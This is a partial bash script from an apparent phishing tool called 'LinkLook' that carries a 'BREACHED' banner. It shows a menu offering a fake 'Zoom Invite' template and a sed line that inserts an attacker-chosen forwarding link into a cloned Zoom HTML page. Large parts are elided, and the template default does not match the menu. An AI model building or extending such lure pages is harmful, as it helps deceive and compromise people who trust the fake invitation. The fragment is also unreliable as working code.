...
banner() {
clear
printf "\e[1;96m _       ___  _  _  _    \e[0m\e[1;77m_      _____  _____  _  _ \e[0m\n"
printf "\e[1;96m( )     (_  )(_)(_)( )_  \e[0m\e[1;77m( )    (  _  )(  _  )( )(_)\e[0m\n"
printf "\e[1;96m| |       | |  |  \ |  _ \ \e[0m\e[1;77m| |    | ( ) || ( ) || | _ \e[0m\n"
printf "\e[1;96m| |   _   | |  | \ \| | ) )\e[0m\e[1;77m| |  _ | | | || | | || |( )\e[0m\n"
printf "\e[1;96m| |__( ) _| |_ | | \  |/ / \e[0m\e[1;77m| |_( )| (_) || (_) || | \ \e[0m\n"
printf "\e[1;96m(_____/(_____)(_)  (_)(_/  \e[0m\e[1;77m(_____)(_____)(_____)(_)  (_)\e[0m\n"
printf " \e[1;93m LinkLook Ver 1.0 \e[0m \n"
printf " \e[1;77m BREACHED | youtube.com/mainaksadhukhan \e[0m \n"
...
if [[ $option_tem -eq 1 ]]; then
  ...
  sed 's+forwarding_link+'$link'+g' Zoom2.html > index2.html # <-- Changed here
fi
rm -rf index3.html
}
...
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
  ...
  printf "\n-----Choose a template----\n"    
  printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Zoom Invite\e[0m\n"
   # <-- Changed here
  default_option_template="3"
